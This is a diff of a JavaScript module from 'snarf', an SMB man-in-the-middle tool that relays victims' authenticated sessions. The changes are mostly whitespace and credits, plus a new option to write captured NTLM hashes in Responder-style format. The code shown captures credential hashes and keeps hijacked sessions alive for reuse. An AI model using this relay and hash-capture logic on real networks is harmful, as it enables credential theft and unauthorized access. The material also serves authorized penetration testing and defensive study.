@@ -1,17 +1,18 @@
 //
 // snarf - SMB man-in-the-middle tool
-// Copyright (C) 2013 Josh Stone (yakovdk@gmail.com)
+// Copyright (C) 2015 Josh Stone (yakovdk@gmail.com)
+//                    Victor Mata (victor@offense-in-depth.com)
 //
 // This program is free software; you can redistribute it and/or
 // modify it under the terms of the GNU General Public License
 // as published by the Free Software Foundation; either version 2
 // of the License, or (at your option) any later version.
-// 
+//
 // This program is distributed in the hope that it will be useful,
 // but WITHOUT ANY WARRANTY; without even the implied warranty of
 // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 // GNU General Public License for more details.
-// 
+//
 // You should have received a copy of the GNU General Public License
 // along with this program; if not, write to the Free Software
 // Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
@@ -32,7 +33,7 @@ module.exports.SMBBroker = function(globals) {
 
     this.port = function() { return 445 };
 
-    this.inTransition = function() { 
+    this.inTransition = function() {
         return !this.authorizer.authenticated;
     }
 
@@ -64,7 +65,7 @@ module.exports.SMBBroker = function(globals) {
 
         middler.freshen();
         // packet.buffer.writeUInt16LE(middler.oldpid, 0x1e);
-        if(client) { 
+        if(client) {
             if(packet.commandCode == 0x73) {
 
                 // we need to record the UID set by the server
@@ -97,7 +98,7 @@ module.exports.SMBBroker = function(globals) {
             }
             client.write(packet.buffer);
         } else {
-            
+
             // Windows boxes drop SMB connections when there hasn't
             // been an open resource after 15 minutes (by default), so
             // we need to keep the session alive.  We can do this by
@@ -117,8 +118,8 @@ module.exports.SMBBroker = function(globals) {
                 }
             }
         }
-        
-    }   
+
+    }
 
     this.reviewClientPacket = function(packet, server, middler) {
         middler.freshen();
@@ -167,6 +168,12 @@ module.exports.SMBBroker = function(globals) {
                         globals.hashfile.write(hashstring + "\n");
                         globals.hashes[userobj] = true;
                     }
+                    // Keep this out of the above if-statement since we will want
+                    // to save all hashes.
+                    if(globals.responderhash) {
+                        out.blue("Writing responder-style hash format");
+                        globals.betaHash(middler.getClientAddr(), n.htype, hashstring + '\n');
+                    }
                 }
 
                 // This turns out to be important -- if multiple inbound
@@ -185,28 +192,28 @@ module.exports.SMBBroker = function(globals) {
             }
         }
         if(packet.commandCode != 0x74) {
-            
+
             // downgrade to "don't use extended security"; this
             // only works with XP clients and earlier
-            
+
             // var flags = packet.buffer.readUInt16LE(14);
             // packet.buffer.writeUInt16LE(flags & 0xf7ff, 14);
-            
+
             server.write(packet.buffer);
         } else {
             server.pause();
             middler.shutdown();
         }
     }
-    
+
     this.transit = function(packet, sock, middler, server) {
-        
+
         // We need to handle the "authentication" of the
         // hacking tool.  We can simply use copies of the
         // "real" responses we collected during the victim
         // snarfing stage.  In some cases, a tool may make
         // more than one connection.  This is fine, as
-        // long as they are not simultaneous.  
+        // long as they are not simultaneous.
 
         this.authorizer.respond(packet.buffer);
     }
@@ -272,7 +279,7 @@ module.exports.SMBBroker = function(globals) {
     }
 
     this.deactivateKeepAlive = function(middler) {
-        if(middler.attributes && 
+        if(middler.attributes &&
            middler.attributes.timerID) {
             clearInterval(middler.attributes.timerID);
         }
